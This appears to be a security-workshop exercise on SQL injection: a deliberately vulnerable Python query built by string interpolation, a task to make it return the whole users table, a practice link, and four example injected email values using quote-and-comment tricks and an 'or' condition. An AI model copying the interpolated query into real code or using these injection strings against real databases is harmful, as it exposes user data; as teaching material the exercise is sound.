# SQL Injection Exploit

You are given this snippet of code:
```python3
query_email = get_email()
sql_query = f"select * from users where email='{query_email}';"
c.execute(sql_query)
```

This code gets an email from somewhere (we don't know where), places that email into a SQL query string, and runs the query on a pre-existing database schema. However, it is vulnerable to SQL injection. Your task is to give a return value for `get_email()` that will cause this code to return the entire `users` table.

To test your solution and try out the examples below, a schema has been built for you in this SQL fiddle: http://sqlfiddle.com/#!9/7270e8/97/1

You can paste your SQL queries into the box on the right and click "Run SQL" to see the results.

### Examples from slides

In this problem, we can make `get_email()` return whatever we want. Let's try out different return values for `get_email()` and see what the query returns. Try out each of the following examples in the SQL fiddle. During the workshop, we will explain exactly how each of these queries are interpreted by SQL.

#### Example 1

Suppose `get_email()` returns: `kat@htn.com`

Then the corresponding query is: 
```sql
select * from users where email='kat@htn.com';
```

#### Example 2

Suppose `get_email()` returns: `'; -- `

Then the corresponding query is: 
```sql
select * from users where email=''; -- ';
```

#### Example 3

Suppose `get_email()` returns: `kat@htn.com' and 1=0; -- `

Then the corresponding query is: 
```sql
select * from users where email='kat@htn.com' and 1=0; -- ';
```

#### Example 4

Suppose `get_email()` returns: `' or password=md5('bcde'); -- `

Then the corresponding query is: 
```sql
select * from users where email='' or password=md5('bcde'); -- ';
```
